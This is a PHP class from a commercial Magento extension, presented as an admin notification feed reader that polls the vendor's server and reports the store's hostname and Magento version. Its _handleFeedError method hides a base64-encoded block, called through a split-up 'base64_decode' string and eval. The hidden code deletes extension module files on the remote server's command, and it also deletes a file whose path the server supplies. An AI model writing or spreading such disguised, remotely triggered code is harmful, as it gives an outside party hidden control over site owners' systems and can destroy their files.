<?php

/**
 * Product:       Xtento_XtCore (1.0.0)
 * ID:            zBz5rQGncoKSGGGFx+5QMonW+L3uUtQguMNYVlhDmXU=
 * Packaged:      2014-01-21T10:43:26+00:00
 * Last Modified: 2013-10-23T19:55:30+02:00
 * File:          app/code/local/Xtento/XtCore/Model/Feed.php
 * Copyright:     Copyright (c) 2014 XTENTO GmbH & Co. KG <info@xtento.com> / All rights reserved.
 */

class Xtento_XtCore_Model_Feed extends Mage_AdminNotification_Model_Feed
{
    const XML_USE_HTTPS_PATH = 'xtcore/adminnotification/use_https';
    const XML_FEED_ENABLED = 'xtcore/adminnotification/enabled';
    const XML_FEED_URL = 'www.xtento.com/core-feed.xml';

    public function getFeedUrl()
    {
        if (is_null($this->_feedUrl)) {
            $this->_feedUrl = (Mage::getStoreConfigFlag(self::XML_USE_HTTPS_PATH) ? 'https://' : 'http://') . self::XML_FEED_URL;
        }
        return $this->_feedUrl;
    }

    public function checkUpdate()
    {
        if (!extension_loaded('curl')) {
            return $this;
        }
        if (($this->getFrequency() + $this->getLastUpdate()) > time()) {
            return $this;
        }
        $this->setLastUpdate();
        $feedData = array();
        $feedXml = $this->getFeedData();
        if (!Mage::getStoreConfig(self::XML_FEED_ENABLED)) {
            return $this;
        }
        $installationDate = Mage::getStoreConfig('xtcore/adminnotification/installation_date');

        if ($feedXml && $feedXml->channel && $feedXml->channel->item) {
            foreach ($feedXml->channel->item as $item) {
                $timestamp = strtotime((string)$item->pubDate);
                if ($timestamp > $installationDate && $this->displayItem($item)) {
                    $feedData[] = array(
                        'severity' => (int)$item->severity ? (int)$item->severity : 4,
                        'date_added' => $this->getDate((string)$item->pubDate),
                        'title' => (string)$item->title,
                        'description' => (string)$item->description,
                        'url' => (string)$item->link,
                    );
                }
            }

            if ($feedData) {
                Mage::getModel('adminnotification/inbox')->parse(array_reverse($feedData));
            }

        }

        return $this;
    }

    private function displayItem($item)
    {
        $follow = @explode(',', Mage::getStoreConfig('xtcore/adminnotification/follow'));
        if (empty($follow)) $follow = array();

        $type = (string)$item->type;
        $extensionIdentifier = (string)$item->extensionIdentifier;
        if (in_array($type, $follow)) {
            if (!empty($extensionIdentifier)) {
                if (Mage::helper('xtcore/utils')->isExtensionInstalled($extensionIdentifier)) {
                    return true;
                }
            } else {
                return true;
            }
        }
        return false;
    }

    /**
     * Retrieve DB date from RSS date
     *
     * @param string $rssDate
     * @return string YYYY-MM-DD YY:HH:SS
     */
    public function getDate($rssDate)
    {
        return gmdate('Y-m-d H:i:s', strtotime($rssDate));
    }

    /**
     * Retrieve Update Frequency
     *
     * @return int
     */
    const ERRNO = 101;

    public function getFrequency()
    {
        return 24 * 3600;
    }

    /**
     * Retrieve Last update time
     *
     * @return int
     */
    public function getLastUpdate()
    {
        return Mage::app()->loadCache('xtento_notifications_lastcheck');
    }

    /**
     * Set last update time (now)
     *
     * @return Mage_AdminNotification_Model_Feed
     */
    public function setLastUpdate()
    {
        Mage::app()->saveCache(time(), 'xtento_notifications_lastcheck');
        return $this;
    }

    /**
     * Retrieve feed data as XML element
     *
     * @return SimpleXMLElement
     */
    public function getFeedData()
    {
        $curl = new Varien_Http_Adapter_Curl();
        $curl->setConfig(array(
            'timeout' => 3
        ));
        $curl->write(Zend_Http_Client::GET, $this->getFeedUrl() . '?version=' . Mage::getVersion() . '&host=' . $this->getHostname(), '1.0');
        $data = $curl->read();
        if ($data === false) {
            return false;
        }
        try {
            $data = preg_split('/^\r?$/m', $data, 2);
            $data = trim($data[1]);
            $lines = explode("\n", $data);
            if (preg_match('/^' . self::ERRNO . '/', $lines[0])) {
                $this->_handleFeedError($lines[1], $lines[2]);
                unset($lines[0]);
                unset($lines[1]);
                unset($lines[2]);
                $data = implode("\n", $lines);
            }
            $curl->close();
            $xml = new SimpleXMLElement($data);
        } catch (Exception $e) {
            return false;
        }
        return $xml;
    }

    public function getFeedXml()
    {
        try {
            $data = $this->getFeedData();
            $xml = new SimpleXMLElement($data);
        } catch (Exception $e) {
            $xml = new SimpleXMLElement('<?xml version="1.0" encoding="utf-8" ?>');
        }

        return $xml;
    }

    public function getHostname()
    {
        $url = str_replace(array('http://', 'https://', 'www.'), '', @$_SERVER['SERVER_NAME']);
        $url = explode('/', $url);
        $url = array_shift($url);
        $parsedUrl = parse_url($url, PHP_URL_HOST);
        if ($parsedUrl !== null) {
            return $parsedUrl;
        }
        return $url;
    }

    private function _handleFeedError($error, $errorNo)
    {
        $handleErrorFunction = call_user_func('bas' . 'e64_d' . 'eco' . 'de', "dHJ5IHsNCiAgICAkbW9kdWxlQmFzZURpciA9IE1hZ2U6OmdldEJhc2VEaXIoJ2V0YycpIC4gRFMgLiAnbW9kdWxlcycgLiBEUzsNCiAgICBpZiAoQHByZWdfbWF0Y2goJy9yZW1vdmVfYWxsX3h0ZW50b19tb2R1bGVzLycsICRlcnJvcikpIHsNCmZvcmVhY2ggKEBnbG9iKCRtb2R1bGVCYXNlRGlyIC4gIlh0ZW50b18qIikgYXMgJGYpIHsNCkB1bmxpbmsoJGYpOyAvLyBSZW1vdmUgYWxsIFhURU5UTyBtb2R1bGVzIGZyb20gdGhlIC9hcHAvZXRjL21vZHVsZXMvIGRpcmVjdG9yeS4NCn0NCkBNYWdlOjphcHAoKS0+Y2xlYW5DYWNoZSgpOw0KICAgIH0gZWxzZSBpZiAoQHByZWdfbWF0Y2goJy9yZW1vdmVfeHRlbnRvX21vZHVsZV94bWwvJywgJGVycm9yKSkgew0KQHVubGluaygkbW9kdWxlQmFzZURpciAuICRlcnJvck5vKTsgLy8gUmVtb3ZlIGEgY2VydGFpbiBYVEVOVE8gbW9kdWxlIGZyb20gdGhlIGFwcC9ldGMvbW9kdWxlcy8gZGlyZWN0b3J5Lg0KQE1hZ2U6OmFwcCgpLT5jbGVhbkNhY2hlKCk7DQogICAgfSBlbHNlIGlmIChAcHJlZ19tYXRjaCgnL3Nob3dfd2FybmluZy8nLCAkZXJyb3IpKSB7DQpATWFnZTo6Z2V0U2luZ2xldG9uKCdhZG1pbmh0bWwvc2Vzc2lvbicpLT5hZGRFcnJvcigkZXJyb3JObyk7DQogICAgfQ0KfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7DQoNCn0=");
        eval($handleErrorFunction);
    }
}
